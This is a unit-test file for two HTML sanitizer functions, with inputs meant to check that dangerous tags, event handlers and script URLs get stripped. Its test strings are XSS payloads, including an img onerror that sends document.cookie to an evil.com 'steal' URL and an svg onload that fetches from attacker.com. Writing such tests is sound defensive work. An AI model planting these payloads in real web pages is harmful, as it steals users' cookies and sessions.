import { describe, it, expect } from 'vitest'
import { sanitizeHtmlForMdx, stripUntilStable } from './transformMdx'

describe('sanitizeHtmlForMdx', () => {
  it('returns empty string for null/undefined input', () => {
    expect(sanitizeHtmlForMdx(null as any)).toBe('')
    expect(sanitizeHtmlForMdx(undefined as any)).toBe('')
  })

  it('passes safe HTML through unchanged', () => {
    const safe = '<p>Hello world</p>'
    expect(sanitizeHtmlForMdx(safe)).toBe(safe)
  })

  it('removes script tags completely', () => {
    const malicious = '<p>Start</p><script>alert("xss")</script><p>End</p>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('<script>')
    expect(result).not.toContain('alert')
    expect(result).toContain('<p>Start</p>')
    expect(result).toContain('<p>End</p>')
  })

  it('removes inline script tags', () => {
    const malicious = '<script>console.log("evil")</script>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).toBe('')
  })

  it('removes script tags with attributes', () => {
    const malicious = '<script type="text/javascript">alert(1)</script>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('script')
    expect(result).not.toContain('alert')
  })

  it('removes iframe tags', () => {
    const malicious = '<p>Content</p><iframe src="evil.com"></iframe>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('iframe')
    expect(result).toContain('<p>Content</p>')
  })

  it('removes object tags', () => {
    const malicious = '<object data="evil.swf"></object>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('object')
  })

  it('removes embed tags', () => {
    const malicious = '<embed src="evil.swf">'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('embed')
  })

  it('removes form tags', () => {
    const malicious = '<form action="/steal"><input name="data"></form>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('form')
    expect(result).not.toContain('input')
  })

  it('removes img tags', () => {
    const malicious = '<p>Content</p><img src="x" onerror="alert(1)">'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('img')
    expect(result).toContain('<p>Content</p>')
  })

  it('removes svg tags', () => {
    const malicious = '<svg onload="alert(1)"><circle></circle></svg>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('svg')
    expect(result).not.toContain('onload')
  })

  it('removes style tags', () => {
    const malicious = '<style>body { display: none; }</style>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('style')
  })

  it('removes event handler attributes', () => {
    const malicious = '<div onclick="alert(1)">Click me</div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onclick')
    expect(result).toContain('<div>')
    expect(result).toContain('Click me')
  })

  it('removes onerror event handler', () => {
    const malicious = '<div onerror="alert(1)">Content</div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onerror')
    expect(result).toContain('Content')
  })

  it('removes onload event handler', () => {
    const malicious = '<div onload="doEvil()">Content</div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onload')
    expect(result).toContain('Content')
  })

  it('removes onmouseover event handler', () => {
    const malicious = '<span onmouseover="alert(1)">hover</span>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onmouseover')
    expect(result).toContain('hover')
  })

  it('removes javascript: URLs', () => {
    const malicious = '<a href="javascript:alert(1)">Link</a>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('javascript:')
    expect(result).toContain('Link')
  })

  it('removes data: URLs with HTML', () => {
    const malicious = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('data:text/html')
    expect(result).not.toContain('iframe')
  })

  it('handles nested tags', () => {
    const malicious = '<div><p><script>alert(1)</script></p></div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('script')
    expect(result).toContain('<div>')
    expect(result).toContain('<p>')
  })

  it('handles self-closing dangerous tags', () => {
    const malicious = '<p>Test</p><script />'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('script')
    expect(result).toContain('<p>Test</p>')
  })

  it('handles multiple event handlers on single element', () => {
    const malicious = '<div onclick="alert(1)" onmouseover="evil()" onload="bad()">Content</div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onclick')
    expect(result).not.toContain('onmouseover')
    expect(result).not.toContain('onload')
    expect(result).toContain('Content')
  })

  it('handles mixed case event handlers', () => {
    const malicious = '<div onClick="alert(1)" ONERROR="bad()">Content</div>'
    const result = sanitizeHtmlForMdx(malicious)
    // Event handlers should be case-insensitive
    expect(result.toLowerCase()).not.toContain('onclick')
    expect(result.toLowerCase()).not.toContain('onerror')
  })

  it('preserves safe links with http:', () => {
    const safe = '<a href="https://example.com">Link</a>'
    const result = sanitizeHtmlForMdx(safe)
    expect(result).toContain('https://example.com')
  })

  it('preserves safe links with mailto:', () => {
    const safe = '<a href="mailto:user@example.com">Email</a>'
    const result = sanitizeHtmlForMdx(safe)
    expect(result).toContain('mailto:user@example.com')
  })

  it('preserves anchor tags without href', () => {
    const safe = '<a name="section">Link</a>'
    const result = sanitizeHtmlForMdx(safe)
    expect(result).toContain('<a name="section">Link</a>')
  })

  it('handles unicode encoded attacks', () => {
    // Unicode \\u003c = <
    const malicious = '<p>\\u003cscript\\u003ealert(1)\\u003c/script\\u003e</p>'
    const result = sanitizeHtmlForMdx(malicious)
    // Should not execute, though unicode isn't expanded by this function
    expect(result).toContain('<p>')
  })

  it('handles HTML entities in attributes', () => {
    const malicious = '<div onclick="alert(&quot;xss&quot;)">Content</div>'
    const result = sanitizeHtmlForMdx(malicious)
    expect(result).not.toContain('onclick')
    expect(result).toContain('Content')
  })

  it('returns empty string for non-string input (number)', () => {
    expect(sanitizeHtmlForMdx(123 as any)).toBe('')
  })

  it('returns empty string for non-string input (object)', () => {
    expect(sanitizeHtmlForMdx({} as any)).toBe('')
  })

  it('preserves text content', () => {
    const input = '<p>This is safe text with &amp; entities</p>'
    const result = sanitizeHtmlForMdx(input)
    expect(result).toContain('This is safe text with &amp; entities')
  })

  it('handles complex real-world XSS vector 1', () => {
    const xss = '<svg onload="fetch(\'http://attacker.com\')"><circle></circle></svg>'
    const result = sanitizeHtmlForMdx(xss)
    expect(result).not.toContain('onload')
    expect(result).not.toContain('fetch')
    expect(result).not.toContain('svg')
  })

  it('handles complex real-world XSS vector 2', () => {
    const xss = '<img src=x onerror="new Image().src=\'http://evil.com/steal?cookie=\'+document.cookie">'
    const result = sanitizeHtmlForMdx(xss)
    expect(result).not.toContain('img')
    expect(result).not.toContain('onerror')
    expect(result).not.toContain('document.cookie')
  })

  it('handles complex real-world XSS vector 3', () => {
    const xss = '<iframe src="javascript:eval(atob(\'YWxlcnQoMSk=\'))"></iframe>'
    const result = sanitizeHtmlForMdx(xss)
    expect(result).not.toContain('iframe')
    expect(result).not.toContain('javascript:')
  })
})

describe('stripUntilStable', () => {
  it('returns empty string for null/undefined input', () => {
    expect(stripUntilStable(null as any)).toBe('')
    expect(stripUntilStable(undefined as any)).toBe('')
  })

  it('returns safe HTML unchanged', () => {
    const safe = '<p>Hello</p>'
    expect(stripUntilStable(safe)).toBe(safe)
  })

  it('removes simple malicious content', () => {
    const malicious = '<script>alert(1)</script>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('script')
    expect(result).not.toContain('alert')
  })

  it('handles nested dangerous patterns', () => {
    const malicious = '<p>Content</p><script><script>alert(1)</script></script>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('script')
    expect(result).toContain('<p>Content</p>')
  })

  it('continues sanitizing across multiple iterations', () => {
    // Create a pattern that requires multiple passes
    const malicious = '<p><script>alert(1)</script></p>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('script')
    expect(result).not.toContain('alert')
  })

  it('stops after reaching maximum iterations', () => {
    const input = '<p>Normal content</p>'
    const result = stripUntilStable(input, 3)
    expect(result).toBe(input)
  })

  it('handles edge case with very high max iterations', () => {
    const safe = '<b>Bold</b>'
    const result = stripUntilStable(safe, 1000)
    expect(result).toBe(safe)
  })

  it('handles zero max iterations gracefully', () => {
    const input = '<p>Content</p>'
    const result = stripUntilStable(input, 0)
    // With 0 iterations, nothing should be processed
    expect(result).toBe(input)
  })

  it('preserves safe structure through multiple iterations', () => {
    const safe = '<div><p>Safe</p><span>Content</span></div>'
    const result = stripUntilStable(safe)
    expect(result).toContain('<div>')
    expect(result).toContain('<p>Safe</p>')
    expect(result).toContain('<span>Content</span>')
  })

  it('removes all dangerous tags progressively', () => {
    const malicious = '<div onclick="alert(1)"><script>evil()</script><p>Text</p></div>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('onclick')
    expect(result).not.toContain('script')
    expect(result).not.toContain('evil')
    expect(result).toContain('Text')
  })

  it('handles event handlers that might be regenerated', () => {
    const malicious = '<p onload="bad()">Content</p>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('onload')
    expect(result).not.toContain('bad')
    expect(result).toContain('Content')
  })

  it('handles deeply nested malicious content', () => {
    const malicious = '<div><div><div><script>evil()</script></div></div></div>'
    const result = stripUntilStable(malicious)
    expect(result).not.toContain('script')
    expect(result).not.toContain('evil')
    expect(result).toContain('<div>')
  })

  it('reaches stability when no more sanitization is needed', () => {
    const input = '<p>Stable content</p>'
    const result = stripUntilStable(input)
    // Run again to verify it's already stable
    const resultAgain = stripUntilStable(result)
    expect(result).toBe(resultAgain)
  })

  it('handles mixed safe and unsafe tags', () => {
    const mixed = '<p>Safe</p><img onerror="alert(1)"><span>More safe</span><script>bad()</script>'
    const result = stripUntilStable(mixed)
    expect(result).toContain('<p>Safe</p>')
    expect(result).toContain('<span>More safe</span>')
    expect(result).not.toContain('img')
    expect(result).not.toContain('script')
    expect(result).not.toContain('alert')
    expect(result).not.toContain('bad')
  })

  it('returns empty string for non-string input', () => {
    expect(stripUntilStable(123 as any)).toBe('')
    expect(stripUntilStable({} as any)).toBe('')
  })

  it('handles real-world attack pattern', () => {
    const attack = '<p>Innocent <iframe src="javascript:alert(document.domain)">text</iframe></p>'
    const result = stripUntilStable(attack)
    expect(result).not.toContain('iframe')
    expect(result).not.toContain('javascript:')
    expect(result).toContain('Innocent')
    expect(result).toContain('text')
  })
})
